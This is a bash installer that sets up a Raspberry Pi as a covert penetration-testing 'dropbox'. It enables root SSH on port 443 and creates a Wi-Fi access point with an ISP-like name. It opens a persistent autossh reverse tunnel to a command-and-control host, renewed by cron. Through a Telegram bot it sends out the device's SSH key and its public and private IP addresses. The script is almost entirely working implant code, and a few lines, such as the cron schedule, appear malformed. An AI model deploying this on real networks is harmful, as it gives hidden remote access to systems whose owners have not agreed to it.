#!/bin/bash

# Herobrine Pentesting Dropbox Installer for Raspberry Pi
# URL: https://github.com/takito1812/herobrine

# Color variables
resetColor="\e[0m"
redColor="\e[1;31m"
greenColor="\e[1;32m"
yellowColor="\e[1;33m"
blueColor="\e[1;34m"
magentaColor="\e[1;35m"
cyanColor="\e[1;36m"
whiteColor="\e[1;37m"

function isRoot {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${redColor}[!] Sorry, you need to run this as root.${resetColor}"
        exit 1
    fi
}

function pingTest {
    if ! ping -c 1 -q google.com >&/dev/null; then
        echo -e "${redColor}[!] Sorry, there is no internet connection.${resetColor}"
        exit 1
    fi
}

function printBanner {
    echo -e "${magentaColor}
  __                     __         __             
 |  |--.-----.----.-----|  |--.----|__.-----.-----.
 |     |  -__|   _|  _  |  _  |   _|  |     |  -__|
 |__|__|_____|__| |_____|_____|__| |__|__|__|_____|${resetColor}

 ${cyanColor}by Víctor García (@takito1812)${resetColor}
"
}

function initialSetup {
    echo -e "${yellowColor}[*] Updating list of repositories...${resetColor}"
    apt-get update -y

    echo -e "${yellowColor}[*] Disabling IPv6...${resetColor}"
    if ! grep -q "net.ipv6.conf.all.disable_ipv6" /etc/sysctl.conf; then
        echo "net.ipv6.conf.all.disable_ipv6 = 1" >>/etc/sysctl.conf
        sysctl -p
    fi

	echo -e "${yellowColor}[*] Creating script /bin/telegram.sh...${resetColor}"
	read -p "[*] Enter Telegram Bot Token (@BotFather): " token
	read -p "[*] Enter Telegram User ID (@userinfobot): " id
	read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
    echo "#!/bin/bash" >/bin/telegram.sh
    echo "TOKEN="$token"" >>/bin/telegram.sh
    echo "ID="$id"" >>/bin/telegram.sh
    echo 'URL="https://api.telegram.org/bot$TOKEN/sendMessage"' >>/bin/telegram.sh
    echo 'curl -s -X POST $URL -d chat_id=$ID -d text="$1" >/dev/null 2>&1' >>/bin/telegram.sh
    chmod +x /bin/telegram.sh
}

function SSHServer {
    echo -e "${yellowColor}[*] Installing and configuring OpenSSH Server...${resetColor}"
    if ! dpkg -l openssh-server >/dev/null 2>&1; then
        apt-get install openssh-server -y
    fi
    if ! grep -q "PermitRootLogin yes" /etc/ssh/sshd_config; then
    sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config
    fi
    if ! grep -q "Port 443" /etc/ssh/sshd_config; then
        sed -i 's/#Port 22/Port 443/g' /etc/ssh/sshd_config
    fi
    systemctl enable ssh
}

function routedAP {
    echo -e "${yellowColor}[*] Installing the hostapd software package for the access point...${resetColor}"
    if ! dpkg -l hostapd >/dev/null 2>&1; then
        apt-get install hostapd -y
    fi
    echo -e "${yellowColor}[*] Enabling the wireless access point service at boot...${resetColor}"
    sudo systemctl unmask hostapd
	sudo systemctl enable hostapd

    echo -e "${yellowColor}[*] Installing the dnsmasq software package to provide network management services to wireless clients...${resetColor}"
    if ! dpkg -l dnsmasq >/dev/null 2>&1; then
        apt-get install dnsmasq -y
    fi

    echo -e "${yellowColor}[*] Installing netfilter-persistent and iptables-persistent to permanently save firewall rules...${resetColor}"
    DEBIAN_FRONTEND=noninteractive apt-get install netfilter-persistent iptables-persistent -y

    echo -e "${yellowColor}[*] Defining the IP configuration of the wireless interface (192.168.4.1/24)...${resetColor}"
    echo "interface wlan0" >>/etc/dhcpcd.conf
    echo "    static ip_address=192.168.4.1/24" >>/etc/dhcpcd.conf
    echo "    nohook wpa_supplicant" >>/etc/dhcpcd.conf

    echo -e "${yellowColor}[*] Allowing wireless clients to access computers on the main network (Ethernet) and from there to the Internet...${resetColor}"
    echo "net.ipv4.ip_forward=1" >> /etc/sysctl.d/routed-ap.conf

    echo -e "${yellowColor}[*] Setting masquerade firewall rule to substitute IP address of wireless clients with Herobrine IP address...${resetColor}"
    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

    echo -e "${yellowColor}[*] Saving current firewall rules...${resetColor}"
    netfilter-persistent save

    echo -e "${yellowColor}[*] Configuring DHCP and DNS services for the wireless network...${resetColor}"
    mv /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
    echo "interface=wlan0" >> /etc/dnsmasq.conf
    echo "dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,24h" >> /etc/dnsmasq.conf
    echo "domain=wlan" >> /etc/dnsmasq.conf
    echo "address=/gw.wlan/192.168.4.1" >> /etc/dnsmasq.conf

	echo -e "${yellowColor}[*] Enabling the WiFi radio...${resetColor}"
	rfkill unblock wlan

	echo -e "${yellowColor}[*] Creating the hostapd configuration file (AP: MOVISTAR_1337:hacktheplanet)...${resetColor}"
	echo "country_code=ES" >> /etc/hostapd/hostapd.conf
	echo "interface=wlan0" >> /etc/hostapd/hostapd.conf
	echo "ssid=MOVISTAR_1337" >> /etc/hostapd/hostapd.conf
	echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
	echo "channel=7" >> /etc/hostapd/hostapd.conf
	echo "macaddr_acl=0" >> /etc/hostapd/hostapd.conf
	echo "auth_algs=1" >> /etc/hostapd/hostapd.conf
	echo "ignore_broadcast_ssid=0" >> /etc/hostapd/hostapd.conf
	echo "wpa=2" >> /etc/hostapd/hostapd.conf
	echo "wpa_passphrase=hacktheplanet" >> /etc/hostapd/hostapd.conf
	echo "wpa_key_mgmt=WPA-PSK" >> /etc/hostapd/hostapd.conf
	echo "wpa_pairwise=TKIP" >> /etc/hostapd/hostapd.conf
	echo "rsn_pairwise=CCMP" >> /etc/hostapd/hostapd.conf
}

function autoSSH {
	echo -e "${yellowColor}[*] Setting up automatic reverse SSH tunnel...${resetColor}"
	if ! dpkg -l autossh >/dev/null 2>&1; then
        apt-get install autossh -y
    fi

	echo -e "${yellowColor}[*] Generating SSH key pair...${resetColor}"
	ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y 2>&1 >/dev/null

	echo -e "${yellowColor}[*] Sending via Telegram the /root/.ssh/authorized_keys file that has to go in C2...${resetColor}"
	/bin/telegram.sh "$(cat /root/.ssh/id_rsa.pub)"

	echo -e "${yellowColor}[*] Creating script /bin/autossh-connect.sh...${resetColor}"
	read -p "[*] Enter URL with SSH connection data (Format: IP:PORT): " urlssh
	read -p "Continue? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
	echo '#!/bin/bash' >/bin/autossh-connect.sh
	echo 'output="$(curl -s '"$urlssh"')"' >>/bin/autossh-connect.sh
	echo 'host="$(echo $output | cut -d: -f1)"' >>/bin/autossh-connect.sh
	echo 'port="$(echo $output | cut -d: -f2)"' >>/bin/autossh-connect.sh
	echo 'autossh -M 11166 -i /root/.ssh/id_rsa -R 1337:localhost:443 root@$"$host" -p "$port" -o "StrictHostKeyChecking no"' >>/bin/autossh-connect.sh
	echo '/bin/telegram.sh "$(echo Public IP: $(curl -s ifconfig.co))"' >>/bin/autossh-connect.sh
	echo '/bin/telegram.sh "$(echo Private IP: $(hostname -I))"' >>/bin/autossh-connect.sh
	chmod +x /bin/autossh-connect.sh

	echo -e "${yellowColor}[*] Creating cronjob for autossh...${resetColor}"
	crontab -l > mycron
	echo "/5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1" >> mycron
	crontab mycron
	rm mycron
}

function tools {
    if ! dpkg -l nmap >/dev/null 2>&1; then
        apt-get install nmap -y
    fi
}

function reboot {
	read -p "Reboot? (Y/N): " confirm && [[ $confirm == [yY] || $confirm == [yY][eE][sS] ]] || exit 1
	shutdown -r now
}

isRoot
pingTest
printBanner
initialSetup
SSHServer
routedAP
autoSSH
tools
reboot
